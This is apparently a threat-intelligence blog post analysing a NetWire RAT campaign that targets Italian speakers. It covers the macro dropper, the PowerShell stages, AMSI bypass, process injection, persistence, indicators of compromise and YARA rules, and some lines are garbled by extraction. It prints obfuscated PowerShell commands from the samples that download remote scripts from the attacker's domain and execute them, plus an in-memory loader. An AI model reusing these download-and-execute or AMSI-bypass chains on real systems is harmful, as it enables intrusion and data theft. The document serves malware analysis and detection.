One of them is Netwire (MITRE S0198), a multiplatform](https://attack.mitre.org/software/S0198/)\nremote administration tool (RAT) that has been used by criminals and espionage groups at least since 2012.\n\nDuring our Cyber Threat Intelligence monitoring we spotted a particular Office document weaponized to deliver such kind of malicious tool,\nuncovering a hidden malicious campaign designed to target Italian speaking victims. The particular chain of attack we discovered showed\n[interesting technical patterns resembling other previous activities targeting the Italian manufacturing landscape, for this reason we decided to](https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/)\ndig deeper.\n\n## Technical Analysis\n\nThe variant used in this campaign is similar to other samples of the NetWire malware family but has an evolution of the attack chain. The\nfollowing picture reports the NetWire infection chain used in this campaign:\n\nFigure 1: Infection Chain\n\n### The Italian Dropper\n\nThis NetWire campaign is delivered as a malicious email attachment with XML macro embedded into it. Following, the static information of the\ndropper:\n\nHash b7e95d0dcedd77ab717a33163af23ab2fd2dc6d07cdf81c5e4cfe080b0946b79\n\nThreat XLSM document dropper\n\nSize 273 KB (279.577 byte)\n\nFiletype Microsoft Excel Macro Activation Sheet\n\nBrief Description NetWire XLSM Document Dropper with malicious macros embedded into it\n\nSsdeep 6144:LBm/nRdmLKd+le81QPBkmmZBHlSUDIUxOW9c8oactq:KnHmLsgenklZBDkUgWD1cI\n\nTable 1: Static information about the sample\n\n\n-----\n\nO ce ope ed, t e ce docu e t oo s e a docu e t t so e dy a c e e e ts but as t so e c c ab e butto s e e, t e c ass ca\nsecurity notice informs us that macros are contained in the document and are disabled.\n\nFigure 2: Overview of the malicious document\n\nThe macro contained inside the document is quite minimal and does not contain dead code or other anti-analysis technique, a part of the\nrandom looking variable naming.\n\nFigure 3: Extracted Macro\n\nThe VBS macro snippet contacts the “cloudservices-archive.]best” domain in order to download the next stage payload hidden inside a file\nnamed as picture file, but it is not a picture and neither an executable: it actually is a XSL stylesheet containing Javascript able to load another\nActiveX object.\n\nFigure 4: Piece of the JS code\n\nThe obfuscation of this powershell command is straightforward to decode and the result is the following:\n\n'(&'+'(G'+'C'+'^#^'.replace('^#^','M')+' *W-'+'O*)'+ 'Ne'+'t.'+'W'+'eb'+'C'+'li'+'ent)'+'.D'+'ow'+'nl'+'oa'+'d'+'F'+'il'+'e(''http://cloudservicesarchive.best/fiber.vbs'',$env:APPDATA+''\\.vbs'')'|I`E`X;start-process($env:APPDATA+ '\\.vbs')\n\nCode Snippet 1\n\nAt this point, the malware tries to download the additional “fiber.vbs” file from the previous location, a small code snippet hiding powershell\ninvocation through several nested replacements.\n\nFigure 5: Piece of the downloaded VBS script\n\nIn fact, this time the code is heavily obfuscated and contains many string manipulation subroutines, but, once the result string is reconstructed,\nthe abovementioned powershell reference becomes clearer.\n\nFigure 6: Piece of the deobfuscated powershell payload\n\nThe complete powershell command to be executed is the following:\n\n\"Powershell -ExecutionPolicy Bypass $c145=-Join ((111, 105, 130)| ForEach-Object {( [Convert]::ToInt16(([String]$_ ), 8) -As[Char])});sal oE2 $c1\n(36,84,98,111,110,101,61,39,42,69,88,39,46,114,101,112,108,97,99,101,40,39,42,39,44,39,73,39,41,59,115,97,108,32,77,32,36,84,98,111,110,10\n\n[char[]]$qcCBgFfvdOauid -join ''|o`E`2\"\n\nCode Snippet 2\n\nIt actually contains another powershell stage designed to gain awareness of the execution environment and trigger the execution of an\nadditional stage:\n\n$Tbone='*EX'.replace('*','I');sal M $Tbone;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$p22 =\n\n[Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol =\n$p22;$mv='(&'+'(G'+'C'+'$$$'.replace('$$$','M')+' *W-'+'O*)'+\n'Ne'+'t.'+'W'+'eb'+'C'+'li'+'ent)'+'.D'+'ow'+'nl'+'oa'+'d'+'S'+'tr'+'ing(''http://cloudservices-archive.best/image01.jpg'')'|I`E`X;$asciiChars= $mv split '-' |ForEach-Object {[char][byte]\"0x$_\"};$asciiString= $asciiChars -join ''|M\n\nCode Snippet 3\n\nIn this case, the malware downloads the “image01.jpg” file from the same domain of the previous stages. If the download is successful, the\nmalware reads raw bytes from the downloaded file and transforms them into ready to execute powershell code. Here, two dynamically linked\nlibraries are unpacked and prepared to be loaded in memory: one is for AMSI bypass and the oher is the final payload.\n\nfunction BIFOwcVW {  [CmdletBinding()] Param ([byte[]] $zFtQd)  Process {    $wPqD = New-Object 'Syste#####moryStream'.Replace('#####\n(, $zFtQd )   $ceqjTnon = New-Object 'Syste#####moryStream'.Replace('#####','m.IO.Me')     $SLpCW = New-Object\n['[email protected]@@@@@@@@pStream'.Replace('@@@@@@@@@','O.Compression.Gzi') $wPqD,](https://yoroi.company/cdn-cgi/l/email-protection)\n([IO.Compression.CompressionMode]::Decompress)\n$bWWEdq = New-Object byte[](1024) while($true){   $pvts = $SLpCW.Read($bWWEdq, 0, 1024)   if ($pvts -le 0){break}   $ceqjTnon.Write($b\n$pvts)   }       [byte[]] $CkJ = $ceqjTnon.ToArray()   Write-Output $CkJ }}\n$t0=-Join ((111, 105, 130)| ForEach-Object {( [Convert]::ToInt16(([String]$_ ), 8) -As[Char])});sal g $t0;[Byte[]]$MNB=\n('OBFUSCATED_PAYLOAD_1'.replace('9^','0x'))| g;\n\n[Byte[]]$blindB=('OBFUSCATED_PAYLOAD_2'.replace('9^','0x'))| g\n\n[byte[]]$BQreEc = BIFOwcVW $blindB[byte[]]$qcsScMu = BIFOwcVW $MNB\n$y='[System.AppDomain]'|g;$g55=$y.GetMethod(\"get_CurrentDomain\") $uy=$g55.Invoke($null,$null) $vmc='$uy.Lo%$($BQreEc)'.Replace('%$\ng [oioioi]::fdsfdf() $vmc2='$uy.Lo%$($qcsScMu)'.Replace('%$','ad') $vmc2| g [Byte[]]$MNB2=('OBFUSCATED_PAYLOAD_3'.replace('9^','0x')\ng [JAM.CASTLE]::CRASH('notepad.exe',$MNB2)\n\nCode Snippet 4\n\n\n-----\n\ne sc pt a so co gu es a pe s ste ce ec a s copy g tse s de t e d ecto y % %\\ oca \\ c oso t a d sett g up t e a\nregistry key on “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run”.\n\nFigure 7: Deobfuscation of the command to prepare the persistence mechanism\n\nFigure 8: Evidence of the persistence mechanism\n\n### Hacking Tool #1: Patching the AmsiScanBuffer\n\nThe first of the two DLL embedded in the previous powershell snippets is actually used as a tool to bypass AMSI, the Microsoft's AntiMalware\nScan Interface. In particular, after its loading, the first method of this DLL run in the infection chain is the “[oioioi]::fdsfdf()” one.\n\nFigure 9: Evidence of the Patching AmsiScanBuffer technique\n\nThe above figure shows how the trick is done: from the “Assembly Title” field it retrieves the two component, “amsi.dll” and “AmsiScanBufer”,\nrequired to reference the target method to patch to avoid payload detection at runtime.\n\n### Hacking Tool #2: The Injector\n\nActually, the second DLL is not the final payload. It rather is another utility: a process injection utility used to hide the malware implant into\nother processes memory.\n\nFigure 10: Evidence of the decompiled Injector module\n\nAs seen in the Code Snippet 4, the variable $MNB is passed as parameter on the invocation of the static method “CRASH”, in the “CASTLE”\nclass. The other parameter is the target process where the injection takes place. This .NET compiled executable contains many references to\nthe injection method used from the attacker. A piece of them is the following:\n\nFigure 11: Evidence of the injection calls inside the code\n\n### The Payload\n\nThe final payload was stored in the $MNB2 variable catched in the last powershell stage.\n\nHash 4E4001C6C47D09009EB24CE636BF5906\n\nThreat NetWire executable\n\nSize 148.00 KB (151552 bytes)\n\nBrief Description Final payload of NetWire Rat\n\nSsdeep 3072:2XFgYEAsB4+Cb3iiDUCcmE90rvPkGK+drboYMIFfS:2XGYEVat3iiDUCcf+rEG5+zIFf\n\nTable 2: Static information about the Netwire Payload\n\nWhile analyzing the binary structure, we recovered the hardcoded IP address of the configured command and control server: 185.140.53.]48.\nA Belgian host operated by an anonymized services provider abused by this actor. The Netwire executable uses a self-decrypting routine to\nrun its trojan modules, it allocates a new memory area and then decrypts the clean code as shown in the figure below.\n\nFigure 12: Piece of the Self-Decrypting routine\n\nOnce decrypted, the malware saves its bot information into the registry key “HKCU\\Software\\Netwire”. At this point it was easy to spot the\nmalicious functions characterizing Netwire RAT variants. To sum it up, Netwire RAT enables its operator to acquire sensitive information from\nvictim machine, for instance by:\n\nstealing Outlook credentials;\nstealing Internet Explorer Browser History;\nstealing Chrome Browser History;\nstealing Mozilla Browser History;\nrecording keystrokes.\n\nAll the sensitive data acquired with this piece of malware, is then sent to the attacker command and control server, potentially enabling frauds\nand further network compromise.\n\nFigure 13: Track of the set registry key\n\nFigure 14: Complete Registry key\n\n### Similarities and Patterns\n\n\n-----\n\nt s a a ys s, e desc bed a attac des g ed to u e ta a ct s a d de e a p ece o t e so ca ed co od ty a a e t a\nintense code manipulation to avoid detection.\n\nHowever, this particular kind of manipulation and obfuscation schema is not new to us. In fact, especially when dealing with the powershell\n[stages, we noticed some variable and name structures was quite similar to one of our the last report about a recent Aggah Campaign insisting](https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/)\non the Italian Manufacturing industry.\n\nThe decoding function of the payloads is the same, despite the variable names. In addition, the variable names “$MNB” and “blindB” have\nbeen conserved. Potentially, this could also mean part of these techniques are reused by other actors insisting on the Italian landscape or also\nthe Aggah actor is probing a different infection chain.\n\nFigure 15: Similarities between Netwire campaign and Aggah Campaign\n\n## Conclusion\n\nDuring the years, Netwire RAT gained lots of success and cyber actors adopted it to infect their victims, even state sponsored groups such as\nAPT33 (Refined Kitten) and Gorgon Group included it in their arsenal, remembering us even the so-called commodity malware could represent\na serious threat, especially when managed by experienced attackers able to re-package it to evade detection, leveraging consolidated\noperational practices to speed up cyber attacks.\n\nThe particular campaign we observed shows clear elements indicating the desired target of the attack are italian speaking. It also shows\ninteresting similarities with techniques adopted during recent operations against italian manufacturing sector, that, even if unconfirmed,\nsuggests there could still be low-footprint ongoing operations.\n\n## Indicators of Compromise\n\nHashes:\n\nce7b8394cdc66149f91ed39ce6c047ee\n4e4001c6c47d09009eb24ce636bf5906\n4b8e4d05092389216f947e980ac8a7b9\nad066878659d1f2d0aee06546d3e500b\nebe4a3f4ceb6d8f1a0485e3ce4333a7c\nDropsite:\n\n_cloudservices-archive.]best_\nC2:\n\n_185.]140.]53.]48_\nBot Information Registry:\n\nHKCU\\Software\\NetWire\nPersistence:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\fiber.vbs\n\n### Yara Rules\n\n\n-----\n\n```\n  meta:\n   description = \"Yara Rule for Netwire campaign macro document Jun2020\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2020-06-05\"\n   tlp = \"white\"\n      SHA256 = \"b7e95d0dcedd77ab717a33163af23ab2fd2dc6d07cdf81c5e4cfe080b0946b79\"\n   category = \"informational\"\n  strings:\n          $a1 = {D9 CB 86 F2 BB BE 2F 61 57}\n          $a2 = {70 E0 C0 81 03 07 0E 1C}\n          $a3 = {4F 8B D2 E4 EF EE 50 9A 5C 2E} \n  condition:\n          all of them\n}\nrule NetwireCampaign_Payload_Jun2020{\n  meta:\n   description = \"Yara Rule for Netwire campaign final payload Jun2020\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2020-06-05\"\n   tlp = \"white\"\n      SHA256 = \"cc419a1c36ed5bdae1d3cd35c4572766dc06ad5a447687f87e89da0bb5a42091\"\n   category = \"informational\"\n  strings:\n          $a1 = {c7 04 ?4 ?? ?? ?? ?? e8 6f 2c 00 00 c7 04 ?4 ?? ?? ?? ?? e8 63 2c 00 00 8b 35}\n          $a2 = {89 84 ?4 b0 00 00 00 c7 84 ?4 a4 00 00 00 ?? ?? ?? ?? 66 c7 84 ?4 a8 00 00 00 00 00 e8 ?? ?? ?? ?? 83 ec 28\n85 c0 75 27}\n          $a3 = { c7 44 ?4 0c ?? ?? ?? ?? c7 44 ?4 08 ?? ?? ?? ?? c7 04 ?4 ?? ?? ?? ?? 89 44 ?4 04 e8 39 1c 01 00 83 ec ?? \n}\n  condition:\n          uint16(0) == 0x5A4D and 2 of ($a*)\n}\n\n```\n_This blog post was authored by Luigi Martire, Davide Testa and Luca Mella of Cybaze-Yoroi Zlab._\n\n\n-----",
